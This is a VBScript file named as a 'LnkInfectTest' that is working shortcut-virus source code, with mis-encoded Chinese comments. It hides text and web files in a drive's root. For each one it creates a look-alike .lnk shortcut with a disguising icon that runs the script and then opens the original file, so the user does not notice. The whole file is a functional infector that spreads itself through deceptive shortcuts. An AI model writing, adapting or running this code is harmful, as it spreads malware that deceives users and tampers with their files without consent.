Const VbsHorseVirusName = "LnkInfectTest.vbs"

Call Main()

Sub Main()
	Dim args
	Set args = WScript.Arguments
	If args.Count = 2 Then
		originFilePath = args(0)
		Call OpenFile(originFilePath)
	End If
	
	Call LnkInfectDrive("G:\")
End Sub

Sub OpenFile(filePath)
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	objShell.Run("explorer.exe " & filePath) '��ʹ��CMD�򿪣���ֹ�����ڿ��û�����
	Set objShell = Nothing
End Sub

Sub LnkInfectDrive(drivePath) 'Ϊ���̸�Ŀ¼�����е�txt, log, html�ļ�����ָ��VbsHorse�Ŀ�ݷ�ʽ��������ԭ�ļ�
	Dim objFileSystem
	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
	Dim folder, files
	Set folder = objFileSystem.GetFolder(drivePath)
	Set files = folder.Files
	For Each file In files
		fileSuffix = GetFileSuffix(file.Name)
		If fileSuffix <> "lnk" And file.Name <> VbsHorseVirusName Then '�Ƿ��ǿ�ݷ�ʽ�ļ������ļ������ǲ�����
			lnkPath = drivePath & file.Name & ".lnk"
			If objFileSystem.FileExists(lnkPath) = False Then '����������ļ�
				targetPath = drivePath& VbsHorseVirusName
				args = Chr(34) & file.Name & Chr(34) & " shortcut"
				Call CreateShortcutAndHideOriginFile(lnkPath, targetPath, args, file.Path) '������Ӧ�Ŀ�ݷ�ʽ������ԭ�ļ�
			End If
		End If
	Next
	Set objFileSystem = Nothing
End Sub

Function GetFileSuffix(fileName)
	splitFileNameArray = Split(fileName, ".")
	GetFileSuffix = splitFileNameArray(UBound(splitFileNameArray))
	Set splitFileNameArray = Nothing
End Function

Sub CreateShortcutAndHideOriginFile(lnkPath, targetPath, args, originFilePath) '������Ӧ�Ŀ�ݷ�ʽ������ԭ�ļ�
	originFileSuffix = GetFileSuffix(originFilePath)
	Select Case originFileSuffix '����Ƿ���txt, log, html, htm, mht���͵��ļ�
	Case "txt", "log" '�ı�
		iconPath = "%SystemRoot%\System32\imageres.dll, 97"
	Case "html", "htm", "mht" '��ҳ
		iconPath = "%SystemRoot%\System32\imageres.dll, 2"
	Case Else
		Exit Sub
	End Select
	
	Call HideFile(originFilePath) '����ԭ�ļ�
	
	Dim objShell, shortcut
	Set objShell = CreateObject("WScript.Shell")
	Set shortcut = objShell.CreateShortcut(lnkPath)
	With Shortcut
		.TargetPath = targetPath
		.Arguments = args
		.WindowStyle = 4
		.IconLocation = iconPath
		.Save
	End With
	Set objShell = Nothing
	Set shortcut = Nothing
End Sub

Sub HideFile(filePath)
	Dim objFileSystem, objFile
	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
	Set objFile = objFileSystem.GetFile(filePath)
	objFile.Attributes = 2 '0-��ͨ 1-ֻ�� 2-���� 4-ϵͳ
	Set objFileSystem = Nothing
	Set objFile = Nothing
End Sub